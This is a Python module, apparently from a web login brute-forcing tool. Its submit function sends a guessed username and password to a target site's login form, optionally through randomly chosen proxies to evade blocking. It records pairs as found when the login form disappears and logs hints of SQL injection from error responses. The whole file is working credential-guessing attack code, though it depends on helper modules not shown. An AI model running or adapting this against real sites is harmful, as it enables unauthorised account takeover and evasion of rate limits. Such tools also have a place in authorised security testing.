from utils import events
from cores.actions import randomFromList
from cores.check import parseLoginForm
from cores.analysis import check_login, check_sqlerror, getredirect


def submit(options, loginInfo, tryCred, result):
	# frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	# proc = Browser(options.timeout) # TODO recovery here
	
	# BREAK if we had valid payload?
	# if options.options["-p"] == "sqli" and len(list(result.queue)) > 1:
	# 	return True
	
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	from cores.browser import Browser
	try:
		proc = Browser()
		if options.proxy:
			# Set proxy connect
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		
		proc.open_url(options.login_url)
		_form = parseLoginForm(proc.forms())
		
		if not _form:
			if options.verbose:
				events.error("Get blocked", "BRUTE")
			return False
		else:
			frmCtrl, frmFields = _form
			frmLoginID, btnSubmit = frmCtrl
		if options.verbose and loginInfo != _form:
			events.info("Login form has been changed", "BRUTE")
		#	Select login form
		# page_title = proc.title()
		#	Send request
		
		#	Reload the browser. For javascript redirection and others...
		# proc.reload()
		#	If no login form -> maybe success. Check conditions
		resp = proc.xsubmit(frmCtrl, frmFields, tryCred)
		if options.verbose:
			if len(frmFields) == 2:
				events.warn("['%s']['%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "TRY")
			else:
				events.warn("['%s'] <--> %s" % (tryPassword, proxyAddr), "TRY")
		
		from cores.analysis import getdiff
		diff, src = getdiff(options.txt.decode('utf-8'), resp.content.decode('utf-8'))
		
		# print(getredirect(src))
		"""
			if len(getredirect(src)) == 1:
				open(url)
			TODO craft url
		"""
		# TODO FOLLOW url via windows.location or any html tag HTTP-EQUIV=REFRESH, href
		# Reopen -> analysis
		# diff = getdiff(options.txt, resp.content)
		if not parseLoginForm(proc.forms()):  # != loginInfo:
			test_result = check_login(options, proc, loginInfo)
			if test_result == 1:
				# "If we tried login form with username+password field"
				
				if tryUsername:
					if resp.status_code >= 400:
						events.error("['%s':'%s'] <--> %s" % (tryUsername, tryPassword, proxyAddr), "%s" % (resp.status_code))
					else:
						events.found(tryUsername, tryPassword, proc.get_title())
						# events.success("['%s':'%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "FOUND")
						result.put([options.url, tryUsername, tryPassword])
				# "Else If we tried login form with password field only"
				else:
					if resp.status_code >= 400:
						events.error("[%s] <--> %s" % (tryPassword, proxyAddr), "%s" % (resp.status_code))
					else:
						events.found('', tryPassword, proc.get_title())
						# events.success("[%s] [%s]" % (tryPassword, proc.get_title()), "FOUND")
						result.put([options.url, tryUsername, tryPassword])
			elif test_result == 2 and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
			else:
				# Possibly Error. But sometime it is true
				if options.verbose:
					events.error("['%s': '%s'] [%s]" % (tryUsername, tryPassword, proc.get_title()), "BRUTE")
		# "Login form is still there. Oops"
		else:
			if check_sqlerror(proc.get_resp()) and options.verbose:
				events.success("SQL Injection in login form", "BRUTE")
				events.info("['%s': '%s']" % (tryUsername, tryPassword))
			if options.verbose:
				if tryUsername:
					events.fail("['%s':%s'] <==> %s" % (tryUsername, tryPassword, proxyAddr), diff, proc.get_title())
				else:
					events.fail("['%s'] <==> %s" % (tryPassword, proxyAddr), diff, proc.get_title())
		
		return True
	
	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""
		events.error("%s" % (error), "BRUTE")
	
	finally:
		proc.close()
